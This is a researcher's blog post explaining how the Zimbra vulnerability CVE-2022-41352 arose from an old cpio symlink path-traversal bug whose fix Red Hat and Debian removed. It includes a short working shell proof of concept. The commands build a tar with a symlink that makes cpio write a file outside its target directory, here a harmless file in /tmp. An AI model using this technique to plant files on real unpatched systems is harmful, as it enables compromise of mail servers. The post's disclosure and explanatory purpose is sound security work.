# Blast from the Past: How Attackers Compromised Zimbra With a Patched Vulnerability

Last year, I worked on a vulnerability in Zimbra
([CVE-2022-41352](https://nvd.nist.gov/vuln/detail/CVE-2022-41352) - [my
AttackerKB analysis](https://attackerkb.com/topics/1DDTvUNFzH/cve-2022-41352/rapid7-analysis) for Rapid7)
that turned out to be a new(-ish) exploit path for a really old bug in `cpio` -
CVE-2015-1194. But that was patched in 2019, so what happened?

(I posted this as a tweet-thread awhile back, but I decided to flesh it out and
make it into a full blog post!)

`cpio` is an archive tool commonly used for system-level stuff (firmware images
and such). It can also extract other format, like `.tar`, which we’ll use since
it’s more familiar.

`cpio` has a flag (`--no-absolute-filenames`), off by default,
that purports to prevent writing files outside of the target directory. That’s
handy when, for example, extracting untrusted files with [Amavis](https://gitlab.com/amavis/amavis)
(like Zimbra does).

The problem is, symbolic links can point to absolute paths, and therefore, even
with `--no-absolute-filenames`, there was no safe way to extract an untrusted
archive (outside of using a `chroot` environment or something similar, which
they really ought to do).

Much later, in 2019, the `cpio` team released `cpio` version 2.13, which
[includes a patch for
CVE-2015-1194](https://git.savannah.gnu.org/cgit/cpio.git/commit/?id=45b0ee2b),
with unit tests and everything.

Some (not all) modern OSes include the patched version of cpio, which should be
the end of the story, but it’s not!

I’m currently writing this on Fedora 35, so let’s try exploiting it. We can
confirm that the version of `cpio` installed with the OS is, indeed, the fixed
version:

```
ron@fedora ~ $ cpio --version
cpio (GNU cpio) 2.13
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.

and Sergey Poznyakoff.
```

That means that we shouldn’t be able to use symlinks to write outside of the
target directory, so let’s create a `.tar` file that includes a symlink and a
file written through that symlink (this is largely copied from
[this mailing list post](https://lists.gnu.org/archive/html/bug-cpio/2015-01/msg00000.html):

```
ron@fedora ~ $ mkdir cpiotest
ron@fedora ~ $ cd cpiotest
ron@fedora ~/cpiotest $ ln -s /tmp/ ./demo
ron@fedora ~/cpiotest $ echo 'hello' > demo/imafile
ron@fedora ~/cpiotest $ tar -cvf demo.tar demo demo/imafile
demo
demo/imafile
ron@fedora ~/cpiotest $ rm -f demo /tmp/imafile
```

So now we have a `.tar` with a symlink that goes outside the directory:

```
ron@fedora ~/cpiotest $ tar -tvf ./demo.tar
lrwxrwxrwx ron/ron           0 2023-01-13 15:03 demo -> /tmp/
-rw-r--r-- ron/ron           6 2023-01-13 15:03 demo/imafile
```

In theory, we shouldn’t be able to extract that. Certainly, we can’t with the
standard `tar` executable:

```
ron@fedora ~/cpiotest $ tar -xvf ./demo.tar
demo
demo/imafile
tar: demo/imafile: Cannot open: Not a directory
tar: Exiting with failure status due to previous errors
```

And we *shouldn’t* be able to with `cpio`, since it’s patched…. right?

```
ron@fedora ~/cpiotest $ cpio -i -d --no-absolute-filenames --verbose < ./demo.tar
demo
demo/imafile
4 blocks
ron@fedora ~/cpiotest $ ls
demo@  demo.tar
ron@fedora ~/cpiotest $ ls -l /tmp/imafile
-rw-r--r--. 1 ron ron 6 Jan 13 15:09 /tmp/imafile
```

Wait, what’s happening? This messed me up for awhile! By all accounts, the
current version of `cpio` on a nearly-current version of Fedora shouldn’t be
vulnerable, but it is!

I did some spelunking into the source RPMs and DEBs, and found that both
Red Hat and Debian (and all derived OSes) specifically *remove* the patch, citing
[this forum post](https://lists.gnu.org/archive/html/bug-cpio/2019-11/msg00016.html)
where somebody ran into a bug with initrd!

The mailing list post, from 2019, says they’ll look into how to fix this, but as
far as I can tell, nobody ever did. I imagine that removing
`--no-absolute-filenames` would fix it, but I don’t think anybody actually
looked into this.

Years later, we come to find out that Zimbra uses Amavis, which uses `cpio` by
default (if pax isn’t installed). We found it out because somebody got
exploited, and was kind enough to
[post details about the compromise](https://forums.zimbra.org/viewtopic.php?t=71153&p=306532).
Since I had seen and [written about](https://attackerkb.com/topics/RCa4EIZdbZ/cve-2022-30333/rapid7-analysis)
a very similar vulnerability recently, I recognized what was going on in the
forum post. The biggest hurdle was the confusion about why modern systems are
impacted!

Zimbra did roll out a fix eventually - specifically, Zimbra now requires the
`pax` executable, which is not vulnerable. We
[wrote a blog about this](https://www.rapid7.com/blog/post/2022/10/06/exploitation-of-unpatched-zero-day-remote-code-execution-vulnerability-in-zimbra-collaboration-suite-cve-2022-41352/) back in October when it was new.

One more fun fact.. Ubuntu 18.04 (and as far as I can tell, ONLY Ubuntu 18.04)
backported the patch to cpio 2.12, which really confused my research! I just
happened to be testing Zimbra on Ubuntu 18.04, which includes `cpio` version
2.12, which *should* be vulnerable, but it wasn’t!

It took me awhile to unravel all the weirdness, and I’m happy to report that
it’s all sorted out now.
